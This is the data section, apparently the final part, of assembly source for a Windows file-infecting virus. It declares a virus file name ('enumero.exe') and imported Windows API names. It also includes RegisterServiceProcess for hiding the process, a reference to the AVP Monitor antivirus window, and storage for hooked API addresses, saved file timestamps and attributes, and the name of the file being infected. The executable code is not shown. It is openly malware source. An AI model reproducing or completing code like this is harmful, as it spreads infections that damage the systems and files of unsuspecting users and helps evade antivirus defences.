dd offset GlobalAlloc
dd offset GlobalFree
dd 0

				       ; our API names 
CreateFile  db 'CreateFileA',0
CloseHandleS db 'CloseHandle',0
WriteFileS  db 'WriteFile',0
CloseFile   db 'CloseHandle',0
GetSysDir   db 'GetSystemDirectoryA',0
DeleteFile  db 'DeleteFileA',0
CreateProc  db 'CreateProcessA',0
GetStartUp  db 'GetStartupInfoA',0
GlobalAlloc db 'GlobalAlloc',0
GlobalFree  db 'GlobalFree',0

API_Struct:                             ; structure for API VAs
CreateFileAPI   dd 0
CloseHandleAPI  dd 0
WriteFileAPI    dd 0
CloseFileAPI    dd 0
GetSysDirAPI    dd 0
DeleteFileAPI   dd 0
CreateProcessAPI dd 0
GetStartupInfoAPI dd 0
GlobalAllocAPI dd 0
GlobalFreeAPI dd 0

APIStructEnd:
virusname db '\enumero.exe',0
tempname db '\temp.tmp',0
RegisterService db 'RegisterServiceProcess',0
GetWindowModuleFileName db 'GetWindowModuleFileNameA',0
EnumPModules db 'EnumProcessModules',0
GetMFileName db 'GetModuleFileNameExA',0
EnumProcessModules dd 0
GetModuleFileNameEx dd 0
GetWindowModuleFileNameA dd 0
kernel32 db 'KERNEL32.DLL',0
user32 db 'USER32.DLL',0
psapi db 'PSAPI.DLL',0
avp_wndname  db 'AVP Monitor',0
sinfo:
curpos 		dd 0			   ; ptr to cur member of array
pnames 		dd 0		   	   ; ptr to process names
totalexe 	dd 0
totalwnd 	dd 0
testnums 	dd 0                       ; bool
testednums 	dd 0 
curidx 		dd 0
icnt 		dd 0
re_enum 	db 0
bytesread 	dd 0
handle 		dd 0                       ; file handle
pinfo:                                     ; process information
hprocess 	dd 0                   
pid 		dd 0
maphandle       dd 0
map_ptr		dd 0
nameptrtbl      dd 0
fsize		dd 0
adrtbl          dd 0
oldattrib	dd 0                         ; stored file attribs
ourAPIptr       dd 0
curAPIptr       dd 0
ordinaltbl      dd 0
kernelbase      dd 0
originalRVAptr  dd 0                       ; RVA ptr to our hooked API RVA
msgstruct:
originalRVA     dd 0                       ; orginal RVA of our hooked API
diffpsize       dd 0
oldchksum:
originalvsize   dd 0
lastobjimageoff dd 0
creation       dd 0,0                      ; our file time structures
lastaccess     dd 0,0
lastwrite      dd 0,0
fnameptr       dd 0                        ; ptr to file name we're inf
spawnfile      dd 0
virus_mem      dd 0
phandle        dd 0
newpsize       dd 0
mod_array      dd 0			   ; ptr to allocated module array
del_buf	       dd 0			   ; ptr to allocated delete buf memory
vend:
end vstart
ends



